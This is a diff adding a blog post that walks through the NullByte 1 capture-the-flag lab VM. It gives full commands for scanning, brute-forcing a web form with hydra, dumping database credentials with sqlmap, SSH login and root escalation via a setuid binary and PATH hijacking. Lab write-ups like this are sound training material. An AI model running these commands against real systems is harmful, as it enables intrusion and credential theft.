@@ -1,0 +1,169 @@
+---
+layout: post
+title: "NullByte 1"
+date: 2016-08-30 09:21:46 -0500
+comments: true
+categories: 
+---
+##Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+* Strings
+* Hydra
+
+
+###Vulnerabilities:
+
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.41.0/24`
+{% img  /images/blog/vulhub/nullbyte/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.41.168 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.41.168 -p-`
+
+
+{% img  /images/blog/vulhub/nullbyte/Selection_002.png   [title manually exploit [alt text]] %}
+
+use Nikto to scan
+
+`nikto -h 192.168.41.168`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_003.png   [title manually exploit [alt text]] %}
+
+find phpMyAdmin directory
+
+use wfuzz to scan
+
+`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.168/FUZZ 2>/dev/null`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_004.png   [title manually exploit [alt text]] %}
+
+check the page:
+
+{% img  /images/blog/vulhub/nullbyte/Selection_005.png   [title manually exploit [alt text]] %}
+
+just a gif image. Download it and use strings to check
+
+`strings main.gif`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_006.png   [title manually exploit [alt text]] %}
+
+find `P-): kzMb5nVYJw`, try `192.168.41.168/kzMb5nVYJw`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_007.png   [title manually exploit [alt text]] %}
+
+check the source:
+
+{% img  /images/blog/vulhub/nullbyte/Selection_008.png   [title manually exploit [alt text]] %}
+
+use hydra to crack the key:
+
+`hydra 192.168.41.168 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^&:invalid key" -P /usr/share/wordlists/rockyou.txt -la -t 10 -w 30`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_009.png   [title manually exploit [alt text]] %}
+
+
+got key is `elite`
+
+enter the key, now we have another page:
+
+{% img  /images/blog/vulhub/nullbyte/Selection_010.png   [title manually exploit [alt text]] %}
+
+
+use sqlmap to get database name:
+`sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbs`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_015.png   [title manually exploit [alt text]] %}
+
+use sqlmap to get tables of database mysql:
+
+`sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D mysql --tables`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_016.png   [title manually exploit [alt text]] %}
+
+get column name of table user
+
+`sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D mysql -T user --columns`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_017.png   [title manually exploit [alt text]] %}
+
+get Username and Password
+
+`sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D mysql -T user -C User,Password --dump
+`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_018.png   [title manually exploit [alt text]] %}
+
+` sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D seth --tables`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_019.png   [title manually exploit [alt text]] %}
+
+
+`sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D seth -T users --columns`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_020.png   [title manually exploit [alt text]] %}
+
+`sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D seth -T users -C user,pass --dump`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_021.png   [title manually exploit [alt text]] %}
+
+for ramses's password, it looks like md5, google it, go to [md5decoder](http://md5decoder.org/c6d6bd7ebf806f43c76acc3681703b81) get `omega`.
+
+use this to login ssh 
+
+`ssh ramses@192.168.41.168 -p 777`
+
+get the shell:
+
+{% img  /images/blog/vulhub/nullbyte/Selection_022.png   [title manually exploit [alt text]] %}
+
+try command `history`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_023.png   [title manually exploit [alt text]] %}
+
+find it 
+
+`find / -name "procwatch" 2>/dev/null`
+
+in `/var/www/backup/procwatch`, backup, good.
+
+check the file
+
+`ls -alh /var/www/backup/procwatch`
+
+{% img  /images/blog/vulhub/nullbyte/Selection_024.png   [title manually exploit [alt text]] %}
+
+found it’s setuid
+
+run it
+
+{% img  /images/blog/vulhub/nullbyte/Selection_025.png   [title manually exploit [alt text]] %}
+
+find it just run sh and ps
+
+copy /bin/sh to /var/www/backup
+
+`cp /bin/sh /var/www/backup/ps`
+
+add it to PATH
+
+```
+export PATH=/var/www/backup:$PATH
+echo $PATH
+```
+
+run it `./procwatch` get root
+
+
+{% img  /images/blog/vulhub/nullbyte/Selection_026.png   [title manually exploit [alt text]] %}
+
+
